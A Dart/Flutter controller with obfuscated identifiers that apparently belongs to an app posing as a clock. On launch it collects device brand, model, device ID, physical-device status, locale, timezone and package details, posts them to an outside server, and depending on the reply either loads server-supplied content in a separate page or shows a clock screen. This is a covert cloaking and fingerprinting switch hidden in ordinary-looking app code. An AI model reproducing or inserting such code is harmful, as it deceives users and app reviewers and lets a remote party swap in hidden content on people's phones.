import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import '../../tools/check_net.dart';


class PageLogic extends GetxController {

  var qlckxovej = RxBool(false);
  var sijvmflrh = RxBool(true);
  var iqhyklu = RxString("");
  var remington = RxBool(false);
  var keeling = RxBool(true);
  final sbaetqnmvf = Dio();


  InAppWebViewController? webViewController;

  dynamic irabnhd(){
    final hqwyrsgix = InternetConnectionChecker.instance;
    final gxkyjhr = hqwyrsgix.onStatusChange.skip(1).listen(
          (InternetConnectionStatus qyguwvix) {
        if (qyguwvix == InternetConnectionStatus.connected) {
          brnyj();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            brnyj();
          });
        }
      },
    );
    return gxkyjhr;
  }

  Future<bool> kbtzyo() async {
    var oetkzqjmyn = await NetworkUtils.isNetworkAvailable();
    if(!oetkzqjmyn){
      Get.toNamed('/Apptimeout')?.then((_){
        brnyj();
      });
    }
    return oetkzqjmyn;
  }

  @override
  void onInit() {
    super.onInit();
    irabnhd();
    brnyj();
  }


  Future<void> brnyj() async {

    var keoagsn = await kbtzyo();
    if(!keoagsn){
      return;
    }

    remington.value = true;
    keeling.value = true;
    sijvmflrh.value = false;

    sbaetqnmvf.post("https://ds.h3r3zian.club/VVLHX8DW1I?no_check",data: await lyvqij()).then((value) {
      var ogexs = value.data["ogexs"] as String;
      var qchkavul = value.data["qchkavul"] as bool;
      if (qchkavul) {
        iqhyklu.value = ogexs;
        wilmer();
      } else {
        boehm();
      }
    }).catchError((e) {
      sijvmflrh.value = true;
      keeling.value = true;
      remington.value = false;
    });
  }

  Future<Map<String, dynamic>> lyvqij() async {
    final DeviceInfoPlugin deuoapn = DeviceInfoPlugin();
    PackageInfo sflboeu_mogbnpy = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var biwk = Platform.localeName;
    var tix_xcuG = currentTimeZone;

    var tix_Vd = sflboeu_mogbnpy.packageName;
    var tix_qW = sflboeu_mogbnpy.version;
    var tix_YP = sflboeu_mogbnpy.buildNumber;

    var tix_tdRsKWrO = sflboeu_mogbnpy.appName;
    var tix_uNEOySVA = "";
    var tix_hMEtAou  = "";
    var tix_Bn = "";
    var elodyNolan = "";
    var elsaSimonis = "";
    var darbyStrosin = "";
    var marcBergstrom = "";


    var tix_IktUaYHG = "";
    var tix_TurjYqUf = false;

    if (GetPlatform.isAndroid) {
      tix_IktUaYHG = "android";
      var zdiocwtxau = await deuoapn.androidInfo;

      tix_Bn = zdiocwtxau.brand;

      tix_uNEOySVA  = zdiocwtxau.model;
      tix_hMEtAou = zdiocwtxau.id;

      tix_TurjYqUf = zdiocwtxau.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tix_IktUaYHG = "ios";
      var cialfh = await deuoapn.iosInfo;
      tix_Bn = cialfh.name;
      tix_uNEOySVA = cialfh.model;

      tix_hMEtAou = cialfh.identifierForVendor ?? "";
      tix_TurjYqUf  = cialfh.isPhysicalDevice;
    }

    var res = {
      "tix_tdRsKWrO": tix_tdRsKWrO,
      "tix_YP": tix_YP,
      "tix_qW": tix_qW,
      "tix_Vd": tix_Vd,
      "tix_uNEOySVA": tix_uNEOySVA,
      "tix_xcuG": tix_xcuG,
      "tix_Bn": tix_Bn,
      "tix_hMEtAou": tix_hMEtAou,
      "biwk": biwk,
      "tix_IktUaYHG": tix_IktUaYHG,
      "tix_TurjYqUf": tix_TurjYqUf,
      "elodyNolan" : elodyNolan,
      "elsaSimonis" : elsaSimonis,
      "darbyStrosin" : darbyStrosin,
      "marcBergstrom" : marcBergstrom,

    };
    return res;
  }

  Future<void> boehm() async {
    Get.offAllNamed("/ClockMainPage");
  }

  Future<void> wilmer() async {
    Get.offAllNamed("/Outreload");
  }

  @override
  void dispose() {
    irabnhd().cancel();
    super.dispose();
  }
}
